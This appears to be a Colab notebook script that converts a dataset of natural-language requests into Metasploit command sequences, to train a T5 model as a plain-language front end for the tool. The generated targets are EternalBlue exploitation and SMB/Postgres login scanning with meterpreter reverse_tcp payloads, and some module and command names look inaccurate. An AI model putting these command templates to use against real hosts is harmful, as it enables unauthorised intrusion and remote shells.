!pip install --upgrade transformers
!pip install rouge_score nltk
!pip install -q evaluate
!pip install -q "transformers==4.43.3" "datasets" "accelerate" "evaluate" "sentencepiece"


from google.colab import drive
drive.mount('/content/drive')
# Convert your intent CSV -> T5 input/target (Option A DSL, randomized LHOST/LPORT/RPORT)
import os, random, re
import pandas as pd

# === EDIT THIS PATH IF NEEDED ===
input_csv = "/content/drive/MyDrive/voxlinux_models/metasploit_nlp_dataset_500.csv"
fallback_csv = "/mnt/data/ed6b3f69-e743-4043-8bf3-144c0d45e798.csv"

if os.path.exists(input_csv):
    csv_path = input_csv
elif os.path.exists(fallback_csv):
    csv_path = fallback_csv
else:
    raise FileNotFoundError(f"Could not find dataset at either {input_csv} or {fallback_csv}. Put the file there or change the path.")

print("Loading dataset from:", csv_path)
df = pd.read_csv(csv_path)

# Helper utilities
def random_ipv4(private_range="10"):
    if private_range == "10":
        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    if private_range == "172":
        return f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def pick_port(kind="LPORT", default=None):
    if default:
        return default
    if kind == "RPORT":
        return random.choice([22,80,443,445,3389,5432,3306,1521,8080])
    return random.randint(1025,65534)

def extract_ip(text):
    import re
    m = re.search(r'(\d{1,3}(?:\.\d{1,3}){3})', str(text))
    if m:
        return m.group(1)
    return None

# lightweight mapping heuristics (extend as needed)
module_map = {
    "search_eternalblue": ("exploit/windows/smb/ms17_010_eternalblue", 445, "windows/x64/meterpreter/reverse_tcp"),
    "generate_payload": (None, None, "windows/x64/meterpreter/reverse_tcp"),
    "set_lport": (None, None, None),
    "use_scanner": ("auxiliary/scanner/smb/smb_version", 445, None),
    "postgres_scan": ("auxiliary/scanner/postgres/postgres_login", 5432, None),
    "smb_login": ("auxiliary/scanner/smb/smb_login", 445, None),
    "exploit": ("exploit/multi/http/struts_dni", 80, "java/meterpreter/reverse_tcp"),
}

inputs = []
targets = []

for _, row in df.iterrows():
    text = str(row.get("text","")).strip()
    label = str(row.get("label","")).strip()
    module, default_rport, default_payload = module_map.get(label, (None,None,None))

    rhost = extract_ip(text) or random_ipv4("10")
    lhost = random_ipv4("10")
    rport = default_rport or pick_port("RPORT")
    lport = pick_port("LPORT")

    lines = []
    # choose module (heuristics if label not in map)
    if module:
        lines.append(f"use {module}")
    else:
        lower = text.lower()
        if "ms17" in lower or "eternal" in lower:
            lines.append("use exploit/windows/smb/ms17_010_eternalblue")
            module = "exploit/windows/smb/ms17_010_eternalblue"
            default_payload = "windows/x64/meterpreter/reverse_tcp"
            rport = 445
        elif "postgres" in lower:
            lines.append("use auxiliary/scanner/postgres/postgres_login")
            module = "auxiliary/scanner/postgres/postgres_login"
            rport = 5432
        elif "smb" in lower:
            lines.append("use auxiliary/scanner/smb/smb_version")
            module = "auxiliary/scanner/smb/smb_version"
            rport = 445
        else:
            lines.append("use auxiliary/scanner/portscan/tcp")
            module = "auxiliary/scanner/portscan/tcp"

    # common options
    lines.append(f"set RHOSTS {rhost}")
    if rport:
        lines.append(f"set RPORT {rport}")
    lines.append(f"set LHOST {lhost}")
    lines.append(f"set LPORT {lport}")

    # payload handling
    if default_payload:
        lines.append(f"set PAYLOAD {default_payload}")
    else:
        if "payload" in text.lower() or "generate" in text.lower():
            lines.append("set PAYLOAD windows/x64/meterpreter/reverse_tcp")

    # run and session retrieval for exploit modules
    lines.append("run")
    if module and module.startswith("exploit/"):
        # try to retrieve session after exploit
        lines.append("get_session || sessions -l")

    inputs.append(text)
    targets.append("\n".join(lines))

# create t5-ready dataframe
out_df = pd.DataFrame({"input_text": inputs, "target_text": targets})

# Save to Drive if path exists, else to /mnt/data/
out_drive_path = "/content/drive/MyDrive/voxlinux_models/metasploit_t5_dataset_500_optionA_randomized.csv"
if os.path.exists(os.path.dirname(out_drive_path)):
    out_df.to_csv(out_drive_path, index=False)
    saved_path = out_drive_path
else:
    fallback_save = "/mnt/data/metasploit_t5_dataset_500_optionA_randomized.csv"
    out_df.to_csv(fallback_save, index=False)
    saved_path = fallback_save

print(f"T5-ready dataset saved to: {saved_path} (rows: {len(out_df)})")
print("\nPreview (first 8 rows):\n")
print(out_df.head(8).to_string(index=False))
